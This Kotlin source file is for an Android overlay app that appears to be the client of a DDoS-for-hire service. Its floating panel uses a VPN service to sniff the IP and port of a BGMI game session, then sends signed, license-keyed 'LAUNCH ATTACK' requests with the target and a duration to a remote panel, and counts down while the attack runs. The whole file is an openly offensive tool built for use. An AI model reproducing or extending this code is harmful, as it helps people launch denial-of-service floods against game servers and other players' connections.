package com.teamjadugar.apk

import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.*
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

class FloatingService : Service() {

    private lateinit var windowManager: WindowManager
    private var panelView: View? = null
    private var bubbleView: View? = null

    private lateinit var paramsPanel: WindowManager.LayoutParams
    private lateinit var paramsBubble: WindowManager.LayoutParams

    private var etIp: EditText? = null
    private var etPort: EditText? = null
    private var tvTime: TextView? = null
    private var btnAttack: Button? = null
    private var btnGetIp: Button? = null
    private var tvLog: TextView? = null
    private var tvBubbleTimer: TextView? = null

    private var selectedTime = 120
    private var isAttacking = false
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        var instance: FloatingService? = null
        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                instance?.etIp?.setText(ip)
                instance?.etPort?.setText(port)
                instance?.tvLog?.text = "> TARGET CAUGHT: $ip:$port"
                instance?.tvLog?.setTextColor(Color.parseColor("#00FF00"))
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE

        paramsPanel = WindowManager.LayoutParams(
            (280 * resources.displayMetrics.density).toInt(),
            WindowManager.LayoutParams.WRAP_CONTENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 50; y = 150
        }

        paramsBubble = WindowManager.LayoutParams(
            (80 * resources.displayMetrics.density).toInt(),
            (80 * resources.displayMetrics.density).toInt(),
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 50; y = 150
        }

        // 🔥 Yahan Layout ke naam fix kar diye hain
        panelView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
        bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)

        setupPanelUI()
        setupBubbleDrag()
        showBubble()
    }

    private fun setupPanelUI() {
        etIp = panelView?.findViewById(R.id.fEtIp)
        etPort = panelView?.findViewById(R.id.fEtPort)
        tvTime = panelView?.findViewById(R.id.fTvTime)
        tvLog = panelView?.findViewById(R.id.tvLog)
        btnAttack = panelView?.findViewById(R.id.fBtnAttack)
        btnGetIp = panelView?.findViewById(R.id.fBtnGetIp)
        tvBubbleTimer = bubbleView?.findViewById(R.id.tvBubbleTimer)

        val seekBar = panelView?.findViewById<SeekBar>(R.id.fSeekBar)
        seekBar?.max = 290
        seekBar?.progress = 50
        seekBar?.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(sb: SeekBar?, progress: Int, fromUser: Boolean) {
                selectedTime = progress.coerceAtLeast(30)
                tvTime?.text = "${selectedTime}s"
            }
            override fun onStartTrackingTouch(sb: SeekBar?) {}
            override fun onStopTrackingTouch(sb: SeekBar?) {}
        })

        panelView?.findViewById<View>(R.id.btnMinimize)?.setOnClickListener {
            panelView?.let { windowManager.removeView(it) }
            bubbleView?.let { windowManager.addView(it, paramsBubble) }
        }

        panelView?.findViewById<View>(R.id.btnClose)?.setOnClickListener {
            stopSelf()
        }

        panelView?.findViewById<Button>(R.id.fBtnVpnOff)?.setOnClickListener {
            try { stopService(Intent(this, VpnService::class.java)) } catch (_: Exception) {}
            tvLog?.text = "> VPN STOPPED"
            tvLog?.setTextColor(Color.parseColor("#FF0000"))
        }

        btnGetIp?.setOnClickListener {
            tvLog?.text = "> SNIFFING BGMI..."
            tvLog?.setTextColor(Color.parseColor("#FFC107"))
            startService(Intent(this, VpnService::class.java))
        }

        btnAttack?.setOnClickListener {
            if (isAttacking) return@setOnClickListener
            val ip = etIp?.text.toString().trim()
            val port = etPort?.text.toString().trim().toIntOrNull() ?: 0
            if (ip.isEmpty() || port <= 0) {
                tvLog?.text = "> ENTER VALID IP/PORT"
                tvLog?.setTextColor(Color.parseColor("#FF1744"))
                return@setOnClickListener
            }
            executeAttack(ip, port, selectedTime)
        }
    }

    private fun executeAttack(ip: String, port: Int, duration: Int) {
        isAttacking = true
        btnAttack?.text = "LAUNCHING..."
        btnAttack?.isEnabled = false
        tvLog?.text = "> CONNECTING TO PANEL..."

        Thread {
            try {
                val key = SessionStore.currentKey(this)
                val sessionToken = getSharedPreferences("AETHPrefs", MODE_PRIVATE).getString("session_token", "") ?: ""
                
                val url = URL("${KeyVault.getPanelUrl()}/connect/action")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 15000; conn.readTimeout = 15000

                val body = JSONObject().apply {
                    put("key", key)
                    put("session_token", sessionToken)
                    put("ip", ip)
                    put("port", port)
                    put("time", duration)
                }.toString()

                val timestamp = (System.currentTimeMillis() / 1000).toString()
                val nonce = UUID.randomUUID().toString().replace("-", "").take(16)
                val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)

                val mac = Mac.getInstance("HmacSHA256")
                mac.init(SecretKeySpec(KeyVault.getHmacKey(), "HmacSHA256"))
                
                val tsBytes = java.nio.ByteBuffer.allocate(8).putLong(timestamp.toLong()).array()
                val msgBytes = tsBytes + body.toByteArray() + deviceId.toByteArray()
                val signature = mac.doFinal(msgBytes).joinToString("") { String.format("%02x", it) }

                conn.setRequestProperty("X-App-Signature", signature)
                conn.setRequestProperty("X-App-Timestamp", timestamp)
                conn.setRequestProperty("X-App-Nonce", nonce)
                conn.setRequestProperty("X-Device-Id", deviceId)

                OutputStreamWriter(conn.outputStream).use { it.write(body) }

                val code = conn.responseCode
                val resp = (if (code in 200..299) conn.inputStream else conn.errorStream)?.bufferedReader()?.readText() ?: ""

                handler.post {
                    if (code in 200..299) {
                        val json = JSONObject(resp)
                        if (json.optBoolean("attack", false)) {
                            tvLog?.text = "> ATTACK SENT [${duration}s]"
                            tvLog?.setTextColor(Color.parseColor("#00FF00"))
                            runCountdown(duration)
                        } else {
                            tvLog?.text = "> FAILED: ${json.optString("msg", "Unknown")}"
                            tvLog?.setTextColor(Color.parseColor("#FF1744"))
                            resetAttack()
                        }
                    } else {
                        tvLog?.text = "> SERVER ERROR: $code"
                        tvLog?.setTextColor(Color.parseColor("#FF1744"))
                        resetAttack()
                    }
                }
            } catch (e: Exception) {
                handler.post {
                    tvLog?.text = "> ERROR: ${e.message}"
                    tvLog?.setTextColor(Color.parseColor("#FF1744"))
                    resetAttack()
                }
            }
        }.start()
    }

    private fun runCountdown(duration: Int) {
        Thread {
            for (i in duration downTo 1) {
                handler.post {
                    tvBubbleTimer?.text = "${i}s"
                    tvBubbleTimer?.visibility = View.VISIBLE
                }
                Thread.sleep(1000)
            }
            handler.post {
                tvBubbleTimer?.visibility = View.GONE
                tvLog?.text = "> ATTACK FINISHED"
                tvLog?.setTextColor(Color.parseColor("#00FF00"))
                resetAttack()
            }
        }.start()
    }

    private fun resetAttack() {
        isAttacking = false
        btnAttack?.text = "🚀 LAUNCH ATTACK"
        btnAttack?.isEnabled = true
        btnAttack?.setBackgroundColor(Color.parseColor("#B026FF"))
    }

    private fun setupBubbleDrag() {
        var initX = 0; var initY = 0; var touchX = 0f; var touchY = 0f
        var dragged = false
        bubbleView?.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initX = paramsBubble.x; initY = paramsBubble.y
                    touchX = event.rawX; touchY = event.rawY
                    dragged = false; true
                }
                MotionEvent.ACTION_MOVE -> {
                    if (Math.abs(event.rawX - touchX) > 10 || Math.abs(event.rawY - touchY) > 10) dragged = true
                    paramsBubble.x = initX + (event.rawX - touchX).toInt()
                    paramsBubble.y = initY + (event.rawY - touchY).toInt()
                    windowManager.updateViewLayout(bubbleView, paramsBubble)
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!dragged) {
                        windowManager.removeView(bubbleView)
                        windowManager.addView(panelView, paramsPanel)
                    }
                    true
                }
                else -> false
            }
        }
    }

    private fun showBubble() {
        try {
            windowManager.addView(bubbleView, paramsBubble)
        } catch (e: Exception) {
            Toast.makeText(this, "Overlay permission missing!", Toast.LENGTH_SHORT).show()
            stopSelf()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        try { windowManager.removeView(panelView) } catch (_: Exception) {}
        try { windowManager.removeView(bubbleView) } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
